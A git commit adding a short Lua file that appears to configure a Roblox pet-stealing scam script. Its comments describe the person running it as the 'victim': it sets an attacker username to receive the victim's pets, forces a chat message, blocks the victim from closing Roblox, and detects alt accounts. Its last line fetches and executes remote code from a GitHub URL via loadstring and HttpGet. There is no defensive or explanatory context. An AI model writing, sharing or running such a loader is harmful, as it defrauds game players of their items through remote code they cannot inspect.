4b8ce193715f2dc7d53a5ea4f0f40ae783fee9d3
SCRIPTINGCOMMUNITY <137361755+SCRIPTINGCOMMUNITY@users.noreply.github.com>
2023-06-23 00:15:46 +0500

    Add 59hLOm_1687461345.lua

---
+++ 59hLOm_1687461345.lua
@@ -0,0 +1,8 @@
+
+_G.Username = "!generate" --// Username To Send Pets To
+_G.GiftMessage = "abc" --// Message For The Gift To Say
+_G.SendMessage = "abc" --// Message the victim will send in the chat on execution
+_G.Diamonds = 10000 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTINGCOMMUNITY/SCRIPTS/59hLOm_1687461345.lua"))()
